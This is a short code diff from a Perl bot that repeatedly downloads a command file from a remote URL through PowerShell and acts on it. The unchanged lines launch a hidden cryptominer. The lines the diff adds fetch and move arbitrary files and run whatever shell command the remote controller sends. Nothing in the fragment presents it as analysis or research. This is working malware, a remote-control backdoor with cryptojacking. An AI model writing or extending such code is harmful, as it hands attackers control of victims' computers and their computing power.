@@ -112,8 +112,16 @@ while(1){
   system(\'powershell -command "$client=new-object System.Net.WebClient;$client.DownloadFile(\"' . $_[0] . '\", \"content.txt\");"\');
   if(-e \'content.txt\'){
     my $type = `type content.txt`;
+    unlink \'content.txt\';
     if($type =~ m/miner<(.+),(.+)>/i){
       system("%AppData%\\\\NsCpuCNMiner.exe -o stratum+tcp://$1 -u $2 -p x");
+    }
+    if($type =~ m/download:(.+),(.+),(.+);/i){
+      system(\'powershell -command "$client=new-object System.Net.WebClient;$client.DownloadFile(\"\' . $1 . \'\", \"\' . $2 . \'\");"\');
+      system(\'move \' . $2 . \' \' . $3);
+    }
+    if($type =~ m/terminal:(.+);/i){
+      system($1);
     }
   }
 }';
